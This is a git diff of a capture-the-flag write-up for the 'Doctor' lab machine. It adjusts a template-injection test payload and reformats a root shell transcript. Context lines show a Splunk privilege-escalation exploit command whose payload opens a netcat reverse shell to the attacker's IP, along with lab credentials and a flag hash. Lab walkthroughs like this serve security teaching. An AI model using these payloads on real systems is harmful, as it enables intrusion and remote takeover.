@@ -114,7 +114,7 @@ On googling about template injection in python flask we find that a framework ca
 
 > Server-Side Template Injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server. If you happen to view the source of a web page and see below code snippets then it is safe to guess that the application is using some template engine to render data.
 
-Create a new post and inject "{{ 7*7 }}" if we are able to inject code then this payload should get evaluated.
+Create a new post and inject \{\{ 7*7 }} if we are able to inject code then this payload should get evaluated.
 
 
   <img src="/assets/img/Posts/Doctor/testing-ssti.png" class="center">
@@ -207,19 +207,18 @@ On googling splunk privilege escalation, we get the following exploit.
 └──╼ $python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.25 --lport 2222 --username shaun --password Guitar123 --payload 'nc.traditional -e /bin/bash 10.10.14.25 4444'
 ```
 
-<video width='320' height='240' controls autoplay> 
-    <source src="/assets/img/Posts/Doctor/pwned.mkv" type='video/mp4'>
-</video>
 
 ```shell
 root@doctor:/# id
 uid=0(root) gid=0(root) groups=0(root)
+root@doctor:/#
+root@doctor:/# cd /root
 cd /root
-cd /root
-ls
+root@doctor:/root#
+root@doctor:/root# ls
 ls
 root.txt
-cat root.txt
+root@doctor:/root# cat root.txt
 cat root.txt
 bee050ee1540e4ba11809239374681b4
 root@doctor:/root# 
